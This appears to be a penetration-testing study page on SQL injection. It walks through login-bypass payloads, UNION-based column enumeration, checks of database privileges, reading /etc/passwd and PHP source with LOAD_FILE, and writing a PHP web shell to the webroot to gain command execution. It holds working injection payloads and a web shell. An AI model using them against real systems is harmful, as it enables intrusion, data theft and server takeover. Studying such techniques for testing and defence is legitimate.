---
icon: syringe
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# SQL Injection

An SQL injection occurs when user-input is inputted into the SQL query string without properly sanitizing or filtering the input.

## Logical Operators

### ' or '1'='1'

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username='admin' AND password = 'password';
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username='admin' or '1'='1' AND password = 'password';
```
{% endcode %}

{% hint style="warning" %}
This example requires a username to be known and correct.
{% endhint %}

### ' or '1' = '1 x2

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username='admin' AND password = 'password';
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username='' or '1'='1' AND password = '' or '1' = '1;
```
{% endcode %}

## Comments

### '--&#x20;

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password'
```
{% endcode %}

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username='admin'-- ' AND password = 'something';
```
{% endcode %}

{% hint style="warning" %}
This example requires a username to be known and correct.
{% endhint %}

### ' OR 1=1--

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username = '' OR 1=1-- ' AND password = 'password'
```
{% endcode %}

## UNION Clause

The [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements. This means that through a `UNION` injection, we will be able to `SELECT` and dump data from all across the DBMS, from multiple tables and databases. Let us try using the `UNION` operator in a sample database.

{% hint style="warning" %}
## Equal Columns

A `UNION` statement can only operate on `SELECT` statements with an equal number of columns. For example, if we attempt to `UNION` two queries that have results with a different number of columns, we get the following error:

{% code overflow="wrap" %}
```sql
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```
{% endcode %}
{% endhint %}

### Basic UNION

{% code overflow="wrap" %}
```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
{% endcode %}

### Uneven UNION

In the below example, the data '2' is used to "balance" the UNION. This is because the 'products' table has more columns than the number of columns the injected query is returning.

{% code overflow="wrap" %}
```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```
{% endcode %}

{% hint style="warning" %}
## Data Types

When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. For the sake of simplicity, we will use numbers as our junk data, which will also become handy for tracking our payloads positions, as we will discuss later.
{% endhint %}

{% hint style="success" %}
## NULL Type Tip

For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.
{% endhint %}

## UNION Injection



## Column Enumeration

To find the number of columns selected by the server. There are two methods of detecting the number of columns:

* Using `ORDER BY`
* Using `UNION`

### ORDER BY

To find the count of columns for a table inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.

Start with `order by 1`, sort by the first column, and succeed, as the table must have at least one column.Then we will do `order by 2` and then `order by 3` until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns. If it fails at `order by 4`, this means the table has three columns.

```sql
' order by 1-- 
```

{% hint style="info" %}
Ensure that the white-space ' ' at the end of the comment is included.
{% endhint %}

### UNION

The 'ORDER BY' method always returns the results until we hit an error, while this method always gives an error until we get a success.

Injecting a 3 column `UNION` query:

```sql
' UNION select 1,2,3-- 
```

## Injection Location

While a query may return multiple columns, the web application may only display some of them. So, if we inject our query in a column that is not printed on the page, we will not get its output. This is why we need to determine which columns are printed to the page, to determine where to place our injection.

It is very common that not every column will be displayed back to the user. For example, the ID field is often used to link different tables together, but the user doesn't need to see it. This tells us that columns 2 and 3, and 4 are printed to place our injection in any of them.

The injection cannot be placed at the beginning, or its output will not be printed.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query. To test that we can get actual data from the database 'rather than just numbers,' we can use the `@@version` SQL query as a test and place it in the second column instead of the number 2:

```sql
' UNION select 1,@@version,3,4-- 
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The database version displayed. Now we know how to form our Union SQL injection payloads to successfully get the output of our query printed on the page.

## Reading Files

### Read Privileges

Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMS's, as it can lead to system exploitation, as we will see. For example, in **MySQL**, the DB user must have the `FILE` privilege to load a file's content into a table and then dump data from that table and read files. So, let us start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.

### **DB User**

We have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMS's, as only DBA are given such privileges. The same applies to other common databases.

If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Our `UNION` injection payload will be as follows:

```sql
cn' UNION SELECT 1, user(), 3, 4-- 
```

or:

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- 
```

Which tells us our current user, which in this case is `root`:

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

This is very promising, as a root user is likely to be a DBA, which gives us many privileges.

### **User Privileges**

Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:

```sql
SELECT super_priv FROM mysql.user
```

Once again, we can use the following payload with the above query:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- 
```

If we had many users within the DBMS, we can add `WHERE user="root"` to only show privileges for our current user `root`:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- 
```

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

The query returns `Y`, which means `YES`, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:

{% code overflow="wrap" %}
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 
```
{% endcode %}

From here, we can add `WHERE grantee="'root'@'localhost'"` to only show our current user `root` privileges. Our payload would be:

{% code overflow="wrap" %}
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- 
```
{% endcode %}

And we see all of the possible privileges given to our current user:

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

We see that the `FILE` privilege is listed for our user, enabling us to read files and potentially even write files. Thus, we can proceed with attempting to read files.

### LOAD\_FILE

Now that we know we have enough privileges to read local system files, let us do that using the `LOAD_FILE()` function. The [LOAD\_FILE()](https://mariadb.com/kb/en/load_file/) function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the `/etc/passwd` file:

```sql
SELECT LOAD_FILE('/etc/passwd');
```

Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.

Similar to how we have been using a `UNION` injection, we can use the above query:

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
```

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

We were able to successfully read the contents of the `passwd` file through the SQL injection. Unfortunately, this can be potentially used to leak the application source code as well.

### Example #1

We know that the current page is `search.php`. The default Apache webroot is `/var/www/html`. Let us try reading the source code of the file at `/var/www/html/search.php`.

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- 
```

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

However, the page ends up rendering the HTML code within the browser. The HTML source can be viewed by hitting `[Ctrl + U]`.

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

The source code shows us the entire PHP code, which could be inspected further to find sensitive information like database connection credentials or find more vulnerabilities.

## Writing Files

When it comes to writing files to the back-end server, it becomes much more restricted in modern DBMS's, since we can utilise this to write a web shell on the remote server, hence getting code execution and taking over the server.

This is why modern DBMS's disable file-write by default and require certain privileges for DBA's to write files. Before writing files, we must first check if we have sufficient rights and if the DBMS allows writing files.

### Write File Privileges

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

We have already found that our current user has the `FILE` privilege necessary to write files. We must now check if the MySQL database has that privilege. This can be done by checking the `secure_file_priv` global variable.

#### **secure\_file\_priv**

The [secure\_file\_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, `NULL` means we cannot read/write from any directory.

MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the `FILE` privilege. However, `MySQL` uses `/var/lib/mysql-files` as the default folder. This means that reading files through a `MySQL` injection isn't possible with default settings. Even worse, some modern configurations default to `NULL`, meaning that we cannot read/write files anywhere within the system.

So, let's see how we can find out the value of `secure_file_priv`. Within `MySQL`, we can use the following query to obtain the value of this variable:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

However, as we are using a `UNION` injection, we have to get the value using a `SELECT` statement. This shouldn't be a problem, as all variables and most configurations' are stored within the `INFORMATION_SCHEMA` database. `MySQL` global variables are stored in a table called [global\_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), and as per the documentation, this table has two columns `variable_name` and `variable_value`.

We have to select these two columns from that table in the `INFORMATION_SCHEMA` database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the `secure_file_priv` variable, using the `WHERE` clause we learned about in a previous section.

The final SQL query is the following:

{% code overflow="wrap" %}
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```
{% endcode %}

So, similar to other `UNION` injection queries, we can get the above query result with the following payload. Remember to add two more columns `1` & `4` as junk data to have a total of 4 columns':

{% code overflow="wrap" %}
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- 
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

And the result shows that the `secure_file_priv` value is empty, meaning that we can read/write files to any location.

### SELECT INTO OUTFILE

Now that we have confirmed that our user should write files to the back-end server, let's try to do that using the `SELECT .. INTO OUTFILE` statement. The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

To use it, we can add `INTO OUTFILE '...'` after our query to export the results into the file we specified. The below example saves the output of the `users` table into the `/tmp/credentials` file:

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

If we go to the back-end server and `cat` the file, we see that table's content:

```bash
clue@machine[~]$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

When we `cat` the file, we see that text:

```bash
clue@machine[~]$ cat /tmp/test.txt 

this is a test
```

```bash
clue@machine[~]$ ls -la /tmp/test.txt 

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```

As we can see above, the `test.txt` file was created successfully and is owned by the `mysql` user.

{% hint style="success" %}
## Tip

Advanced file exports utilise the '`FROM_BASE64("base64_data")`' function in order to be able to write long/advanced files, including binary data.
{% endhint %}

### Writing Files through SQL Injection

Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write `file written successfully!` to the `/var/www/html/proof.txt` file, which we can then access on the web application:

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

{% hint style="info" %}
## Note

To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations.

Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
{% endhint %}

The `UNION` injection payload would be as follows:

{% code overflow="wrap" %}
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- 
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

We donâ€™t see any errors on the page, which indicates that the query succeeded. Checking for the file `proof.txt` in the webroot, we see that it indeed exists:

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
## Note

We see the string we dumped along with '1', '3' before it, and '4' after it. This is because the entire 'UNION' query result was written to the file. To make the output cleaner, we can use "" instead of numbers.
{% endhint %}

### Writing a Web Shell

Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:

```php
<?php system($_REQUEST[0]); ?>
```

We can reuse our previous `UNION` injection payload, and change the string to the above, and the file name to `shell.php`:

{% code overflow="wrap" %}
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL:

<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

The output of the `id` command confirms that we have code execution and are running as the `www-data` user.
